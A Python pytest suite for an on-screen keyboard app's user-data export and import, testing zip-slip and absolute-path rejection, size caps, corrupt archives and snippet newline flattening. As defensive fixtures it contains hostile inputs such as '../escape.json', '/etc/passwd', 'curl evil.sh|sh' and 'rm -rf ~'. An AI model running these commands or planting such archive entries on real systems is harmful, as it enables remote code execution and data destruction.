"""Tests for src/data_export.py."""

from __future__ import annotations

import io
import json
import struct
import zipfile
from pathlib import Path

import pytest

from src.data_export import (
    SCHEMA_VERSION,
    DataExportError,
    export_user_data,
    import_user_data,
    inspect_export,
    suggested_export_name,
)


def _manifest(files: list[str], pack_ids: list[str] | None = None) -> str:
    """Minimal valid manifest.json body for a hand-built archive."""
    return json.dumps(
        {
            "schema_version": SCHEMA_VERSION,
            "app_version": "1.0",
            "exported_at": "",
            "files": files,
            "pack_ids": pack_ids or [],
        }
    )


def _patch_central_directory_file_size(zip_bytes: bytes, filename: str, new_size: int) -> bytes:
    """Rewrite the declared (uncompressed) file_size in *filename*'s
    central directory record, leaving the real compressed data untouched.

    ``zipfile.ZipFile.writestr`` always derives ``file_size`` from the
    real data it is given (there is no public API to lie about it), so
    the only way to build an archive whose declared size disagrees with
    its real content is to patch the raw bytes after the fact. See the
    Central Directory File Header layout in the PKZIP APPNOTE: signature
    (4) + 18 bytes of fixed fields + compressed size (4, offset 20) +
    uncompressed size (4, offset 24) + name/extra/comment lengths (2
    each) before the variable-length name.
    """
    name_bytes = filename.encode("utf-8")
    marker = b"PK\x01\x02"
    idx = 0
    while True:
        idx = zip_bytes.find(marker, idx)
        if idx == -1:
            raise AssertionError(f"central directory record for {filename!r} not found")
        name_len = struct.unpack_from("<H", zip_bytes, idx + 28)[0]
        extra_len = struct.unpack_from("<H", zip_bytes, idx + 30)[0]
        comment_len = struct.unpack_from("<H", zip_bytes, idx + 32)[0]
        name_start = idx + 46
        if zip_bytes[name_start : name_start + name_len] == name_bytes:
            patched = bytearray(zip_bytes)
            struct.pack_into("<I", patched, idx + 24, new_size)
            return bytes(patched)
        idx += 46 + name_len + extra_len + comment_len


def _corrupt_member_compressed_bytes(zip_bytes: bytes, filename: str) -> bytes:
    """Flip four bytes in the middle of *filename*'s compressed data,
    leaving the central directory (and so the declared ``file_size`` /
    ``compress_size`` ``zipfile.getinfo()`` reports) untouched, so the
    corruption can only be caught by actually decompressing the stream,
    not by the cheap metadata check ``_validate_archive_entry`` runs
    first.

    Located via the member's *local* file header (``PK\\x03\\x04``), not
    the central directory: the fixed 30-byte header (signature 4 +
    version 2 + flags 2 + method 2 + mod time 2 + mod date 2 + crc32 4 +
    compressed size 4 + uncompressed size 4 + name length 2 + extra
    length 2), then the name and extra fields at the lengths *this*
    header declares (the local header's extra field is not guaranteed to
    match the central directory's), then the compressed data itself,
    whose length is the central directory's ``compress_size``.
    """
    with zipfile.ZipFile(io.BytesIO(zip_bytes)) as zf:
        info = zf.getinfo(filename)
    off = info.header_offset
    name_len = struct.unpack_from("<H", zip_bytes, off + 26)[0]
    extra_len = struct.unpack_from("<H", zip_bytes, off + 28)[0]
    data_start = off + 30 + name_len + extra_len
    data_end = data_start + info.compress_size
    corrupted = bytearray(zip_bytes)
    mid = data_start + info.compress_size // 2
    for i in range(mid, min(mid + 4, data_end)):
        corrupted[i] ^= 0xFF
    return bytes(corrupted)


def _seed_config(config_dir: Path, *, with_pack: bool = True, with_telemetry: bool = True) -> None:
    """Populate a fake config dir with the files an export should pick up
    (and the one it should explicitly skip)."""
    (config_dir / "models").mkdir(parents=True, exist_ok=True)
    (config_dir / "models" / "ngram_model.json").write_text(
        json.dumps({"unigrams": {"hello": 5}, "user_vocab": {"hello": 5}})
    )
    (config_dir / "models" / "ppm_model.json").write_text(json.dumps({"context": []}))
    (config_dir / "analytics.json").write_text(json.dumps({"alltime_keystrokes": 100}))
    if with_telemetry:
        # telemetry.json must NEVER be in the archive.
        (config_dir / "telemetry.json").write_text(
            json.dumps({"anon_id": "00000000-0000-0000-0000-000000000000", "enabled": True})
        )
    if with_pack:
        pack_dir = config_dir / "packs" / "test_pack"
        pack_dir.mkdir(parents=True, exist_ok=True)
        (pack_dir / "dictionary.txt").write_text("alpha\nbeta\ngamma\n")
        (pack_dir / "bigrams.txt").write_text("alpha beta\n")
        (pack_dir / "pack.json").write_text(json.dumps({"name": "Test Pack", "version": "1.0"}))


class TestExport:
    def test_writes_zip_with_manifest(self, tmp_path: Path) -> None:
        config = tmp_path / "config"
        config.mkdir()
        _seed_config(config)
        out = tmp_path / "exp.zip"
        summary = export_user_data(config, out)
        assert out.is_file()
        assert summary.schema_version == SCHEMA_VERSION
        with zipfile.ZipFile(out) as zf:
            assert "manifest.json" in zf.namelist()
            manifest = json.loads(zf.read("manifest.json"))
        assert manifest["schema_version"] == SCHEMA_VERSION
        assert manifest["app_version"]
        assert manifest["exported_at"]

    def test_includes_model_files(self, tmp_path: Path) -> None:
        config = tmp_path / "config"
        config.mkdir()
        _seed_config(config)
        out = tmp_path / "exp.zip"
        export_user_data(config, out)
        with zipfile.ZipFile(out) as zf:
            names = set(zf.namelist())
        assert "models/ngram_model.json" in names
        assert "models/ppm_model.json" in names
        assert "analytics.json" in names

    def test_includes_packs(self, tmp_path: Path) -> None:
        config = tmp_path / "config"
        config.mkdir()
        _seed_config(config)
        out = tmp_path / "exp.zip"
        summary = export_user_data(config, out)
        assert "test_pack" in summary.pack_ids
        with zipfile.ZipFile(out) as zf:
            names = set(zf.namelist())
        assert "packs/test_pack/dictionary.txt" in names
        assert "packs/test_pack/bigrams.txt" in names
        assert "packs/test_pack/pack.json" in names

    def test_excludes_telemetry(self, tmp_path: Path) -> None:
        """The anon_id must NEVER cross machines — that's the entire
        contract of the telemetry consent doc."""
        config = tmp_path / "config"
        config.mkdir()
        _seed_config(config, with_telemetry=True)
        out = tmp_path / "exp.zip"
        export_user_data(config, out)
        with zipfile.ZipFile(out) as zf:
            for name in zf.namelist():
                assert "telemetry" not in name, f"telemetry leaked into export: {name}"

    def test_missing_config_dir_raises(self, tmp_path: Path) -> None:
        with pytest.raises(DataExportError):
            export_user_data(tmp_path / "nope", tmp_path / "exp.zip")

    def test_skips_packs_without_dictionary(self, tmp_path: Path) -> None:
        config = tmp_path / "config"
        config.mkdir()
        _seed_config(config)
        # A pack folder with no dictionary.txt should be ignored — it's
        # not a valid pack and the import-side filter would reject it.
        empty_pack = config / "packs" / "empty_pack"
        empty_pack.mkdir()
        (empty_pack / "bigrams.txt").write_text("foo bar\n")
        out = tmp_path / "exp.zip"
        summary = export_user_data(config, out)
        assert "empty_pack" not in summary.pack_ids

    def test_skips_packs_with_bad_id(self, tmp_path: Path) -> None:
        config = tmp_path / "config"
        config.mkdir()
        _seed_config(config)
        bad = config / "packs" / "../escape"
        # On POSIX this would actually create ../escape; on Windows it
        # fails. Use a regex-violating but filesystem-legal name instead.
        bad = config / "packs" / "BAD NAME"
        bad.mkdir(parents=True)
        (bad / "dictionary.txt").write_text("x\n")
        out = tmp_path / "exp.zip"
        summary = export_user_data(config, out)
        assert "BAD NAME" not in summary.pack_ids


class TestInspect:
    def test_round_trip_manifest(self, tmp_path: Path) -> None:
        config = tmp_path / "config"
        config.mkdir()
        _seed_config(config)
        out = tmp_path / "exp.zip"
        export_user_data(config, out)
        info = inspect_export(out)
        assert info.schema_version == SCHEMA_VERSION
        assert "models/ngram_model.json" in info.files
        assert "test_pack" in info.pack_ids

    def test_missing_file(self, tmp_path: Path) -> None:
        with pytest.raises(DataExportError, match="not found"):
            inspect_export(tmp_path / "nope.zip")

    def test_not_a_zip(self, tmp_path: Path) -> None:
        f = tmp_path / "junk.zip"
        f.write_bytes(b"not a zip")
        with pytest.raises(DataExportError, match="valid .zip"):
            inspect_export(f)

    def test_missing_manifest(self, tmp_path: Path) -> None:
        f = tmp_path / "no_manifest.zip"
        with zipfile.ZipFile(f, "w") as zf:
            zf.writestr("models/ngram_model.json", json.dumps({"unigrams": {}}))
        with pytest.raises(DataExportError, match="manifest.json"):
            inspect_export(f)

    def test_future_schema_rejected(self, tmp_path: Path) -> None:
        f = tmp_path / "future.zip"
        with zipfile.ZipFile(f, "w") as zf:
            zf.writestr(
                "manifest.json",
                json.dumps(
                    {
                        "schema_version": SCHEMA_VERSION + 99,
                        "app_version": "999.0.0",
                        "exported_at": "",
                        "files": [],
                        "pack_ids": [],
                    }
                ),
            )
        with pytest.raises(DataExportError, match="newer schema"):
            inspect_export(f)

    def test_zip_slip_rejected(self, tmp_path: Path) -> None:
        f = tmp_path / "evil.zip"
        with zipfile.ZipFile(f, "w") as zf:
            zf.writestr(
                "manifest.json",
                json.dumps(
                    {
                        "schema_version": SCHEMA_VERSION,
                        "app_version": "1.0",
                        "exported_at": "",
                        "files": [],
                        "pack_ids": [],
                    }
                ),
            )
            zf.writestr("../escape.json", "pwned")
        with pytest.raises(DataExportError, match=r"\.\."):
            inspect_export(f)

    def test_absolute_path_rejected(self, tmp_path: Path) -> None:
        f = tmp_path / "evil.zip"
        with zipfile.ZipFile(f, "w") as zf:
            zf.writestr(
                "manifest.json",
                json.dumps(
                    {
                        "schema_version": SCHEMA_VERSION,
                        "app_version": "1.0",
                        "exported_at": "",
                        "files": [],
                        "pack_ids": [],
                    }
                ),
            )
            zf.writestr("/etc/passwd", "pwned")
        with pytest.raises(DataExportError, match="absolute"):
            inspect_export(f)


class TestImport:
    def test_round_trip_restores_state(self, tmp_path: Path) -> None:
        """Export then import into a fresh dir produces identical files."""
        src_config = tmp_path / "src"
        src_config.mkdir()
        _seed_config(src_config)
        archive = tmp_path / "exp.zip"
        export_user_data(src_config, archive)

        dst_config = tmp_path / "dst"
        dst_config.mkdir()
        import_user_data(archive, dst_config)

        assert (dst_config / "models" / "ngram_model.json").is_file()
        original = (src_config / "models" / "ngram_model.json").read_text()
        restored = (dst_config / "models" / "ngram_model.json").read_text()
        assert original == restored
        assert (dst_config / "packs" / "test_pack" / "dictionary.txt").is_file()

    def test_import_writes_rescue_export(self, tmp_path: Path) -> None:
        """Before overwriting, the current state lands in exports/ so
        the user can revert."""
        src_config = tmp_path / "src"
        src_config.mkdir()
        _seed_config(src_config)
        archive = tmp_path / "exp.zip"
        export_user_data(src_config, archive)

        dst_config = tmp_path / "dst"
        dst_config.mkdir()
        _seed_config(dst_config, with_pack=False)  # different prior state
        # Mark dst's model so we can prove the rescue captured *its* state.
        (dst_config / "models" / "ngram_model.json").write_text(json.dumps({"sentinel": "dst"}))

        import_user_data(archive, dst_config)

        rescues = list((dst_config / "exports").glob("rescue-*.zip"))
        assert len(rescues) == 1
        with zipfile.ZipFile(rescues[0]) as zf:
            with zf.open("models/ngram_model.json") as f:
                rescued = json.load(f)
        assert rescued == {"sentinel": "dst"}

    def test_import_replaces_packs(self, tmp_path: Path) -> None:
        """Packs not in the imported archive are removed (full replace)."""
        src_config = tmp_path / "src"
        src_config.mkdir()
        _seed_config(src_config)
        archive = tmp_path / "exp.zip"
        export_user_data(src_config, archive)

        dst_config = tmp_path / "dst"
        dst_config.mkdir()
        # Seed dst with a different pack that isn't in the archive.
        stale = dst_config / "packs" / "stale_pack"
        stale.mkdir(parents=True)
        (stale / "dictionary.txt").write_text("oldword\n")

        import_user_data(archive, dst_config)

        assert (dst_config / "packs" / "test_pack" / "dictionary.txt").is_file()
        assert not stale.exists(), "stale pack should have been removed"

    def test_telemetry_not_restored(self, tmp_path: Path) -> None:
        """Even if a hand-crafted archive includes telemetry.json, the
        import's allow-list refuses to extract it."""
        f = tmp_path / "evil_but_well_formed.zip"
        with zipfile.ZipFile(f, "w") as zf:
            zf.writestr(
                "manifest.json",
                json.dumps(
                    {
                        "schema_version": SCHEMA_VERSION,
                        "app_version": "1.0",
                        "exported_at": "",
                        "files": ["telemetry.json"],
                        "pack_ids": [],
                    }
                ),
            )
            zf.writestr("telemetry.json", json.dumps({"anon_id": "leaked"}))

        dst = tmp_path / "dst"
        dst.mkdir()
        import_user_data(f, dst)
        assert not (dst / "telemetry.json").exists()

    def test_oversize_entry_rejected(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        """An entry above _MAX_FILE_BYTES is refused at the validation
        gate. Patch the cap to a tiny value so we don't have to write
        gigabytes of test data."""
        from src import data_export

        monkeypatch.setattr(data_export, "_MAX_FILE_BYTES", 8)
        f = tmp_path / "huge.zip"
        with zipfile.ZipFile(f, "w") as zf:
            zf.writestr(
                "manifest.json",
                json.dumps(
                    {
                        "schema_version": SCHEMA_VERSION,
                        "app_version": "1.0",
                        "exported_at": "",
                        "files": [],
                        "pack_ids": [],
                    }
                ),
            )
            zf.writestr("models/ngram_model.json", b"x" * 64)  # > patched cap
        with pytest.raises(DataExportError, match="per-file cap"):
            inspect_export(f)

    def test_undeclared_oversize_member_is_refused(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """entry.file_size comes from the archive's own central directory
        and need not match what decompression actually produces --
        ZipExtFile decompresses the real (larger) stream regardless of
        what the entry claims. _validate_archive_entry only ever sees the
        declared value, so a member that under-declares its size must
        still be caught during extraction, from bytes actually read."""
        from src import data_export

        monkeypatch.setattr(data_export, "_MAX_FILE_BYTES", 8)
        f = tmp_path / "lying.zip"
        real_payload = b"x" * 4096  # far more than the patched 8-byte cap
        with zipfile.ZipFile(f, "w", zipfile.ZIP_STORED) as zf:
            zf.writestr("manifest.json", _manifest(["analytics.json"]))
            zf.writestr("analytics.json", real_payload)

        patched = _patch_central_directory_file_size(f.read_bytes(), "analytics.json", 8)
        f.write_bytes(patched)

        # Confirm the patch actually took: the declared size now lies,
        # and passes the cheap pre-check (8 is not > the patched cap of 8).
        with zipfile.ZipFile(f) as zf:
            assert zf.getinfo("analytics.json").file_size == 8

        dst = tmp_path / "dst"
        dst.mkdir()
        with pytest.raises(DataExportError):
            import_user_data(f, dst)


class TestACorruptMemberCannotHalfApplyTheImport:
    """FIX: _bounded_copy used to catch only zipfile.BadZipFile, but a
    corrupted deflate stream escapes ZipExtFile.read as a raw zlib.error
    instead (measured: "Error -3 while decompressing data: invalid code
    lengths set" / "invalid distance too far back"). import_user_data
    replaces model files one at a time, so a corrupt SECOND member used
    to abort the import with an uncaught zlib.error after the first
    member had already overwritten a good file on disk -- exactly the
    half-applied state _prevalidate_extractable_members now closes by
    reading every member once, fully, before any of them is written."""

    def _build_archive_with_a_sizeable_ppm_model(self, config: Path) -> None:
        # ppm_model.json needs to be large enough to compress into a
        # multi-block deflate stream: a tiny payload can flip a bit and
        # still decompress to *something* (just failing the CRC check,
        # which was already caught before this fix), so this has to be
        # big enough that corrupting the middle of it corrupts the
        # stream itself. Verified against the pre-fix except clause: a
        # 1000-int "context" list reliably reproduces the uncaught
        # zlib.error this fix closes.
        (config / "models").mkdir(parents=True, exist_ok=True)
        (config / "models" / "ngram_model.json").write_text(
            json.dumps({"unigrams": {"hello": 5}, "user_vocab": {"hello": 5}})
        )
        (config / "models" / "ppm_model.json").write_text(
            json.dumps({"context": list(range(1000))})
        )
        (config / "analytics.json").write_text(json.dumps({"alltime_keystrokes": 100}))

    def test_the_uncorrupted_archive_still_imports_cleanly(self, tmp_path: Path) -> None:
        """Positive half: the pre-validation pass changes nothing about
        an ordinary, well-formed import."""
        src_config = tmp_path / "src"
        src_config.mkdir()
        self._build_archive_with_a_sizeable_ppm_model(src_config)
        archive = tmp_path / "exp.zip"
        export_user_data(src_config, archive)

        dst_config = tmp_path / "dst"
        dst_config.mkdir()
        import_user_data(archive, dst_config)

        assert json.loads((dst_config / "models" / "ppm_model.json").read_text()) == json.loads(
            (src_config / "models" / "ppm_model.json").read_text()
        )
        assert not list(dst_config.rglob("*.importing"))

    def test_a_corrupt_second_member_leaves_every_pre_existing_file_untouched(
        self, tmp_path: Path
    ) -> None:
        src_config = tmp_path / "src"
        src_config.mkdir()
        self._build_archive_with_a_sizeable_ppm_model(src_config)
        archive = tmp_path / "exp.zip"
        export_user_data(src_config, archive)

        # _MODEL_FILES iterates ngram_model.json first, ppm_model.json
        # second (see the dict literal in src/data_export.py) -- corrupt
        # only the second one's compressed bytes. Its declared file_size
        # and CRC in the central directory are left alone, so the cheap
        # metadata checks in _validate_archive_entry cannot catch this;
        # only actually decompressing the stream can.
        corrupted = _corrupt_member_compressed_bytes(archive.read_bytes(), "models/ppm_model.json")
        archive.write_bytes(corrupted)

        dst_config = tmp_path / "dst"
        dst_config.mkdir()
        (dst_config / "models").mkdir()
        (dst_config / "models" / "ngram_model.json").write_text(
            json.dumps({"sentinel": "pre-existing ngram, must survive"})
        )
        (dst_config / "models" / "ppm_model.json").write_text(
            json.dumps({"sentinel": "pre-existing ppm, must survive"})
        )
        (dst_config / "analytics.json").write_text(
            json.dumps({"sentinel": "pre-existing analytics, must survive"})
        )
        pack_dir = dst_config / "packs" / "stale_pack"
        pack_dir.mkdir(parents=True)
        (pack_dir / "dictionary.txt").write_text("oldword\n")

        before = {p: p.read_bytes() for p in dst_config.rglob("*") if p.is_file()}
        assert before, "fixture bug: nothing to prove untouched"

        with pytest.raises(DataExportError):
            import_user_data(archive, dst_config)

        # The rescue export (which runs before pre-validation, on
        # purpose -- see import_user_data) is allowed to add a NEW file
        # under exports/; every file that existed beforehand must be
        # byte-for-byte what it was.
        for path, content in before.items():
            assert path.is_file(), f"{path} disappeared during the failed import"
            assert path.read_bytes() == content, f"{path} was modified by the failed import"

        leftovers = list(dst_config.rglob("*.importing"))
        assert leftovers == [], f"a .importing temp file was left behind: {leftovers}"


class TestBoundedCopy:
    """Direct coverage of _bounded_copy: the per-file cap trips on bytes
    actually read, and the running total is enforced across entries, not
    just within one."""

    def test_per_file_cap_trips_on_real_bytes(self, monkeypatch: pytest.MonkeyPatch) -> None:
        import io

        from src import data_export

        monkeypatch.setattr(data_export, "_MAX_FILE_BYTES", 10)
        with pytest.raises(DataExportError, match="per-file cap"):
            data_export._bounded_copy(io.BytesIO(b"x" * 100), io.BytesIO(), "fake.txt", 0)

    def test_running_total_carries_across_entries(self, monkeypatch: pytest.MonkeyPatch) -> None:
        import io

        from src import data_export

        monkeypatch.setattr(data_export, "_MAX_FILE_BYTES", 10)
        monkeypatch.setattr(data_export, "_MAX_TOTAL_UNCOMPRESSED", 15)
        # First entry: 10 bytes, fine on its own (equal to the per-file cap).
        total = data_export._bounded_copy(io.BytesIO(b"a" * 10), io.BytesIO(), "one.txt", 0)
        assert total == 10
        # Second entry is also only 10 bytes (fine on its own too), but
        # the running total (20) now exceeds _MAX_TOTAL_UNCOMPRESSED (15).
        with pytest.raises(DataExportError, match="uncompressed size exceeds cap"):
            data_export._bounded_copy(io.BytesIO(b"b" * 10), io.BytesIO(), "two.txt", total)

    def test_a_corrupt_deflate_stream_is_translated_not_left_to_leak(self, tmp_path: Path) -> None:
        """FIX: a corrupted deflate member used to raise a raw zlib.error
        out of ZipExtFile.read, which _bounded_copy's old
        `except zipfile.BadZipFile` did not catch. Direct unit-level
        coverage of the translation, independent of the full
        import_user_data path covered above."""
        from src import data_export

        f = tmp_path / "one_member.zip"
        with zipfile.ZipFile(f, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("payload.bin", b"x" * 200 + bytes(range(256)) * 8)
        corrupted = _corrupt_member_compressed_bytes(f.read_bytes(), "payload.bin")

        with zipfile.ZipFile(io.BytesIO(corrupted)) as zf, zf.open("payload.bin") as src_f:
            with pytest.raises(DataExportError, match="integrity check"):
                data_export._bounded_copy(src_f, None, "payload.bin", 0)

    def test_dst_f_none_reads_and_counts_but_writes_nothing(self) -> None:
        """The pre-validation pass calls _bounded_copy with dst_f=None:
        every byte must still be read and counted against the caps, just
        never written anywhere."""
        from src import data_export

        total = data_export._bounded_copy(io.BytesIO(b"abc" * 10), None, "fake.txt", 0)
        assert total == 30

    def test_a_write_failure_is_not_mistaken_for_a_corrupt_archive(self) -> None:
        """The except clause in _bounded_copy wraps only the read off
        src_f, not the write to dst_f, on purpose: a write failure (disk
        full, permission denied -- both surface as OSError, the same
        family the bz2 decompressor's "Invalid data stream" is now
        caught under) must propagate as-is rather than being reported as
        a corrupt archive, since nothing about the archive was at
        fault."""
        from src import data_export

        class _ExplodingWriter:
            def write(self, data: bytes) -> int:
                raise OSError("disk full")

        with pytest.raises(OSError, match="disk full"):
            data_export._bounded_copy(io.BytesIO(b"hello"), _ExplodingWriter(), "fake.txt", 0)


class TestReservedPackNames:
    """A pack id that collides with a Windows reserved device name (con,
    nul, com1, ...) passes PACK_ID_RE (it looks like a normal lowercase
    id) but would fail dest_dir.mkdir() on Windows. It must never be
    extracted, and its presence must not abort the rest of the import."""

    def test_reserved_name_pack_is_skipped_but_import_still_succeeds(self, tmp_path: Path) -> None:
        archive = tmp_path / "reserved.zip"
        with zipfile.ZipFile(archive, "w") as zf:
            zf.writestr(
                "manifest.json",
                _manifest(
                    ["packs/con/dictionary.txt", "packs/good_pack/dictionary.txt"],
                    pack_ids=["con", "good_pack"],
                ),
            )
            zf.writestr("packs/con/dictionary.txt", "alpha\n")
            zf.writestr("packs/good_pack/dictionary.txt", "beta\n")

        dst = tmp_path / "dst"
        dst.mkdir()
        import_user_data(archive, dst)  # must not raise

        assert not (dst / "packs" / "con").exists()
        assert (dst / "packs" / "good_pack" / "dictionary.txt").is_file()

    def test_helper_matches_case_insensitively_and_with_extension(self) -> None:
        from src.prediction.pack_ids import is_reserved_device_name

        assert is_reserved_device_name("con")
        assert is_reserved_device_name("CON")
        assert is_reserved_device_name("Con.txt")
        assert is_reserved_device_name("com1")
        assert is_reserved_device_name("lpt9")
        assert not is_reserved_device_name("console")
        assert not is_reserved_device_name("company")

    def test_export_skips_a_pre_existing_reserved_name_pack(self, tmp_path: Path) -> None:
        """Only reachable on a platform that never enforced the Windows
        restriction (e.g. the folder was created on Linux), but export
        must not hand back an archive that cannot be re-imported.

        Uses "aux" rather than "nul": on some Windows builds "nul"
        redirects to the null device even as a directory path component,
        which would make the test fixture itself unwritable regardless of
        this fix.
        """
        config = tmp_path / "config"
        config.mkdir()
        pack_dir = config / "packs" / "aux"
        pack_dir.mkdir(parents=True)
        (pack_dir / "dictionary.txt").write_text("x\n")
        out = tmp_path / "exp.zip"
        summary = export_user_data(config, out)
        assert "aux" not in summary.pack_ids


class TestSnippetNewlineFlattening:
    """FIX: an imported snippet value must not be able to carry a Return
    or a Tab keypress. src/snippets.py::_clean_value already strips \\r
    for every load; this covers the import-specific extra flattening,
    which also collapses \\n and \\t (locally-authored snippets keep
    both, see tests/test_snippets.py::test_value_preserves_newlines and
    test_a_locally_authored_snippet_keeps_its_tab below)."""

    def _archive_with_snippet_value(self, path: Path, value: str) -> None:
        with zipfile.ZipFile(path, "w") as zf:
            zf.writestr("manifest.json", _manifest(["snippets.json"]))
            zf.writestr(
                "snippets.json",
                json.dumps({"version": 1, "snippets": [{"label": "Evil", "value": value}]}),
            )

    def test_embedded_newline_is_flattened_to_a_space(self, tmp_path: Path) -> None:
        archive = tmp_path / "evil.zip"
        self._archive_with_snippet_value(archive, "curl evil.sh|sh\necho done")
        dst = tmp_path / "dst"
        dst.mkdir()
        import_user_data(archive, dst)
        data = json.loads((dst / "snippets.json").read_text())
        value = data["snippets"][0]["value"]
        assert "\n" not in value
        assert value == "curl evil.sh|sh echo done"

    def test_embedded_crlf_is_flattened(self, tmp_path: Path) -> None:
        archive = tmp_path / "evil.zip"
        self._archive_with_snippet_value(archive, "line one\r\nline two")
        dst = tmp_path / "dst"
        dst.mkdir()
        import_user_data(archive, dst)
        data = json.loads((dst / "snippets.json").read_text())
        value = data["snippets"][0]["value"]
        assert "\r" not in value
        assert "\n" not in value

    def test_embedded_tab_is_flattened_to_a_space(self, tmp_path: Path) -> None:
        """FIX: a tab is also a real keystroke on both synthesizers
        (Windows resolves it to VK_TAB, `xdotool type` types it), and Tab
        moves focus in the target app rather than inserting a character,
        so it needs the same treatment as \\r / \\n."""
        archive = tmp_path / "evil.zip"
        self._archive_with_snippet_value(archive, "curl evil.sh|sh\techo done")
        dst = tmp_path / "dst"
        dst.mkdir()
        import_user_data(archive, dst)
        data = json.loads((dst / "snippets.json").read_text())
        value = data["snippets"][0]["value"]
        assert "\t" not in value
        assert value == "curl evil.sh|sh echo done"

    def test_a_locally_authored_snippet_keeps_its_tab(self, tmp_path: Path) -> None:
        """Positive half of the tab fix: the flatten step only ever
        touches an *imported* snippets.json (see the caller in
        import_user_data). A snippet the user typed and saved through the
        running app's own SnippetStore must keep a tab exactly as
        SnippetStore._clean_value already allows -- this fix must not
        become a backdoor that strips tabs from local data nothing here
        ever imported."""
        from src.snippets import SnippetStore

        store_path = tmp_path / "snippets.json"
        store = SnippetStore(store_path)
        store.load()
        assert store.set(0, "Tabbed", "one\ttwo")
        assert store.get_value(0) == "one\ttwo"

    def test_reload_after_import_never_sees_a_newline(self, tmp_path: Path) -> None:
        """End-to-end through the same loader the running app uses."""
        from src.snippets import SnippetStore

        archive = tmp_path / "evil.zip"
        self._archive_with_snippet_value(archive, "rm -rf ~\ndone")
        dst = tmp_path / "dst"
        dst.mkdir()
        import_user_data(archive, dst)

        store = SnippetStore(dst / "snippets.json")
        store.load()
        assert store.get_value(0) == "rm -rf ~ done"

    def test_a_failed_flatten_leaves_no_temp_file_behind(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """The flatten writes through a `.flattening` temp file, and it is
        the last thing an otherwise-successful import touches, so a stray
        one is exactly what the user would be left looking at. The two
        extraction loops clean up their own `.importing` files the same
        way."""
        archive = tmp_path / "evil.zip"
        self._archive_with_snippet_value(archive, "one\ntwo")
        dst = tmp_path / "dst"
        dst.mkdir()

        real_replace = Path.replace

        def explode(self: Path, target):  # type: ignore[no-untyped-def]
            if self.name.endswith(".flattening"):
                raise OSError("simulated rename failure")
            return real_replace(self, target)

        monkeypatch.setattr(Path, "replace", explode)

        import_user_data(archive, dst)  # must not raise

        # Proves the flatten really did run and really did fail -- without
        # this the glob below would pass on a build where the step never
        # executed at all.
        data = json.loads((dst / "snippets.json").read_text())
        assert data["snippets"][0]["value"] == "one\ntwo", "the simulated failure did not fire"

        leftovers = list(dst.glob("*.flattening"))
        assert leftovers == [], f"flatten left a temp file behind: {leftovers}"

    def test_malformed_snippets_json_does_not_abort_the_rest_of_the_import(
        self, tmp_path: Path
    ) -> None:
        """The flatten step runs after snippets.json has already been
        extracted; a parse failure there must not undo an otherwise-
        successful import of the other files."""
        archive = tmp_path / "weird.zip"
        with zipfile.ZipFile(archive, "w") as zf:
            zf.writestr("manifest.json", _manifest(["models/ngram_model.json", "snippets.json"]))
            zf.writestr("models/ngram_model.json", json.dumps({"unigrams": {"hi": 1}}))
            zf.writestr("snippets.json", "not valid json {{{")
        dst = tmp_path / "dst"
        dst.mkdir()
        import_user_data(archive, dst)  # must not raise
        assert (dst / "models" / "ngram_model.json").is_file()
        # Left exactly as extracted -- the flatten step gave up cleanly.
        assert (dst / "snippets.json").read_text() == "not valid json {{{"

    def test_snippets_json_absent_from_archive_is_left_untouched(self, tmp_path: Path) -> None:
        """The flatten step must only run on a file the archive actually
        replaced; a pre-existing local snippets.json outside the import's
        scope must not be rewritten."""
        dst = tmp_path / "dst"
        dst.mkdir()
        local = dst / "snippets.json"
        local.write_text(
            json.dumps({"version": 1, "snippets": [{"label": "Home", "value": "a\nb"}]})
        )

        archive = tmp_path / "no_snippets.zip"
        with zipfile.ZipFile(archive, "w") as zf:
            zf.writestr("manifest.json", _manifest(["models/ngram_model.json"]))
            zf.writestr("models/ngram_model.json", json.dumps({"unigrams": {"hi": 1}}))
        import_user_data(archive, dst)

        assert json.loads(local.read_text())["snippets"][0]["value"] == "a\nb"


class TestSuggestedName:
    def test_format(self) -> None:
        from datetime import datetime

        name = suggested_export_name(datetime(2026, 5, 19, 14, 30, 22))
        assert name == "Alpha-OSK-Export-2026-05-19-143022.zip"
